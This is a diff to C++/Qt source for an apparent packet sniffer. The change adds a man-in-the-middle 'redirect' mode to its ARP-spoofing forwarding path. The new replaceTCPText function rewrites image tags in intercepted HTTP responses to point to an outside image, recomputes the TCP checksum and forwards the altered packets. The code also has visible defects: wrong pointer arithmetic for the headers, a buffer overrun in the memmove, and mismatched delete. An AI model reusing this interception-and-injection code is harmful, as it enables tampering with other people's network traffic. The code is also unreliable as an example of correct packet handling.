@@ -14,6 +14,9 @@ MainWindow::MainWindow(QWidget *parent) :
     ui->setupUi(this);
     ui->pb_scroll->setCheckable(true);
     ui->pb_arp->setCheckable(true);
+    ui->pb_arp->setEnabled(false);
+    ui->pb_redirect->setCheckable(true);
+    ui->pb_redirect->setDown(true);
     ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
     client1 = NULL;
     client2 = NULL;
@@ -141,6 +144,7 @@ void                MainWindow::StartSniffing(const std::string &interface)
     sniffer->Initialize(interface);
     thread->start();
     ui->pb_sniff->setText("STOP");
+    ui->pb_arp->setEnabled(true);
 }
 
 void                MainWindow::ToggleSniffer()
@@ -163,6 +167,7 @@ void                MainWindow::ToggleSniffer()
 
             ui->pb_arp->setDown(true);
         }
+        ui->pb_arp->setEnabled(false);
 
         return ;
     }
@@ -399,7 +404,7 @@ void            MainWindow::refreshArp()
 
 void    MainWindow::checkArp(SniffedPacket &packet)
 {
-    if (client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
+    if (!ui->pb_redirect->isChecked() || client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
         return;
 
     eth_hdr_t *eth = (eth_hdr_t *) packet.data;
@@ -417,42 +422,100 @@ void    MainWindow::checkArp(SniffedPacket &packet)
     sin.sin_port = 0;
     sin.sin_addr.s_addr = ip->ip_destaddr;
 
-    const char *pdata = packet.data;
-    int psize = packet.size;
+    replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\"");
 
-    // Image replace
-    //    std::string data(packet.data, packet.size);
-    //    if (packet.protocol == "TCP" && packet.sport == 80)
-    //    {
-    //        std::string tofind("img src=\"img/me.jpg\"");
-    //        std::string toreplace("img src=\"img/me.png\"");
-    //        std::size_t index = 0;
+    sendto(_socket_arp, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
+}
 
-    //        while ((index = data.find(tofind, index)) != std::string::npos)
-    //        {
-    //            std::string img(data.c_str() + index, 40);
-    //            qDebug() << "FOUND : " << img.c_str();
-    //            psize += toreplace.length() - tofind.length();
-    //            data.replace(index, tofind.length(), toreplace);
-    //            pdata = data.c_str();
-    //            index += toreplace.length();
-    //        }
+void *memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen)
+{
+    int needle_first;
+    const void *p = haystack;
+    size_t plen = hlen;
 
-    //        tofind = std::string("gzip");
-    //        toreplace = std::string("");
-    //        index = 0;
+    if (!nlen)
+        return NULL;
 
-    //        while ((index = data.find(tofind, index)) != std::string::npos)
-    //        {
-    //            std::string img(data.c_str() + index, 40);
-    //            qDebug() << "FOUND md5: " << img.c_str();
-    //            psize += toreplace.length() - tofind.length();
-    //            data.replace(index, tofind.length(), toreplace);
-    //            pdata = data.c_str();
-    //            index += toreplace.length();
-    //        }
-    //}
+    needle_first = *(unsigned char *)needle;
 
+    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
+    {
+        if (!memcmp(p, needle, nlen))
+            return (void *)p;
 
-    sendto(_socket_arp, pdata + ETHER_HDR_SIZE, psize - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
+        p = ((char *) p) + 1;
+        plen = hlen - (((char *) p) - (char *) haystack);
+    }
+
+    return NULL;
+}
+
+void    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &find, const std::string &replace)
+{
+    if (packet.protocol != "TCP" || packet.sport != 80)
+        return ;
+
+    std::vector<std::size_t>    indexes;
+    char                        *found;
+    char                        *buffer = packet.data;
+    while ((found = (char *) memmem(buffer, packet.size - (buffer - packet.data), find.c_str(), find.length()))!= NULL)
+    {
+        indexes.push_back(found - packet.data);
+        buffer = found + find.length();
+    }
+
+    if (!indexes.size())
+        return;
+
+    int     new_size = packet.size + replace.length() * indexes.size() - find.length() * indexes.size();
+    char    *data = new char[new_size];
+    std::memcpy(data, packet.data, packet.size);
+    delete packet.data;
+    packet.size = new_size;
+    packet.data = data;
+
+    for (std::size_t i = 0; i < indexes.size(); ++i)
+    {
+        qDebug() << "FOUND Replace";
+        std::memmove(&data[indexes[i] + replace.length()], &data[indexes[i]], packet.size - indexes[i]);
+        std::memcpy(&data[indexes[i]], replace.c_str(), replace.length());
+    }
+
+    // Modify TCP Checksum
+    IP_HDR      *iphdr = (IP_HDR *) packet.data + ETHER_HDR_SIZE;
+    TCP_HDR     *tcphdr = (TCP_HDR *) (char *) iphdr + packet.iphdr_size;
+    uint32_t    sum = 0;
+    uint16_t    padding = 0;
+    uint16_t    proto_tcp = 6;
+    uint16_t    w16;
+    char        *datasum = (char *) tcphdr;
+    int         size = packet.size - packet.iphdr_size;
+    uint16_t    old_checksum = tcphdr->checksum;
+    tcphdr->checksum = 0;
+
+    if (size & 1)
+    {
+        padding = 1;
+        datasum[size] = 0;
+    }
+    for (int i = 0; i < size + padding; i = i + 2)
+    {
+        w16 = ((datasum[i] << 8) & 0xFF00) + (datasum[i + 1] & 0xFF);
+        sum += (unsigned long) (w16);
+    }
+    for (int i = 0; i < 4; i = i + 2)
+    {
+        w16 = ((((char *) &iphdr->ip_srcaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_srcaddr)[i + 1] & 0xFF);
+        sum += (w16);
+        w16 = ((((char *) &iphdr->ip_destaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_destaddr)[i + 1] & 0xFF);
+        sum += (w16);
+    }
+
+    sum += (proto_tcp) + (size);
+    while (sum >> 16)
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    sum = ~sum;
+
+    tcphdr->checksum = (unsigned short) htons(sum);
+    qDebug() << old_checksum << " = " << (unsigned short) htons(sum);
 }
